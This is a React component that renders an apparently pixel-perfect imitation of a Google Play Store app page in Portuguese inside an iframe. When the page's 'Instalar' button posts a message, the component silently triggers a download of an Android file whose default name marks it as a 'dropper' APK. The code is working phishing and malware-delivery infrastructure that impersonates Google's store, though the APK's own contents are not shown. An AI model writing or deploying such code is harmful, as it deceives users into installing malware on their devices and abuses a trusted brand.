import React, { useEffect, useState } from 'react';
import { Loader2 } from 'lucide-react';
import { AppRecord, getAppBySlug, fetchBaseHtml, renderPlaystoreHtml } from '../services/playstore';

interface PlayStorePageProps {
  slug?: string;
}

export const PlayStorePage: React.FC<PlayStorePageProps> = ({ slug = 'cineva' }) => {
  const [loading, setLoading] = useState(true);
  const [app, setApp] = useState<AppRecord | null>(null);
  const [htmlDoc, setHtmlDoc] = useState<string>('');

  useEffect(() => {
    let isMounted = true;
    async function loadData() {
      setLoading(true);
      try {
        const found = await getAppBySlug(slug || 'cineva');
        if (isMounted && found) {
          setApp(found);
          const pageTitle = `${found.appName} – Apps no Google Play`;
          document.title = pageTitle;

          const baseHtml = await fetchBaseHtml();
          if (baseHtml && isMounted) {
            const transformed = renderPlaystoreHtml(baseHtml, found);
            setHtmlDoc(transformed);
          }
        }
      } catch (err) {
        console.error('Error loading Play Store page:', err);
      } finally {
        if (isMounted) setLoading(false);
      }
    }

    loadData();
    return () => {
      isMounted = false;
    };
  }, [slug]);

  // Listen for iframe download triggers from the Instalar button
  useEffect(() => {
    const handleMessage = (e: MessageEvent) => {
      if (e.data && e.data.type === 'DOWNLOAD_APK') {
        const fileUrl = e.data.url || '/Cineva_build_1791234061_7bce5c20_dropper.apk';
        const fileName = e.data.name || 'Cineva_build_1791234061_7bce5c20_dropper.apk';
        const link = document.createElement('a');
        link.href = fileUrl;
        link.download = fileName;
        link.target = '_self';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
      }
    };
    window.addEventListener('message', handleMessage);
    return () => window.removeEventListener('message', handleMessage);
  }, []);

  if (loading) {
    return (
      <div className="flex h-screen w-screen items-center justify-center gap-3 bg-white font-sans text-neutral-600">
        <Loader2 className="animate-spin text-[#01875f]" size={28} />
        <span className="text-[15px] font-medium">Carregando aplicativo…</span>
      </div>
    );
  }

  if (!app || !htmlDoc) {
    return (
      <div className="flex h-screen w-screen flex-col items-center justify-center p-6 text-center font-sans">
        <h1 className="text-xl font-semibold text-neutral-800">Aplicativo não encontrado</h1>
        <p className="mt-2 max-w-md text-sm text-neutral-500">
          O aplicativo &ldquo;{slug}&rdquo; não foi localizado.
        </p>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 w-screen h-screen overflow-hidden bg-white select-text">
      {/* Complete Pixel-Perfect Google Play Store Page */}
      <iframe
        srcDoc={htmlDoc}
        title={app.appName}
        className="w-full h-full border-none m-0 p-0 block bg-white"
        style={{ border: 'none', width: '100%', height: '100%' }}
      />
    </div>
  );
};
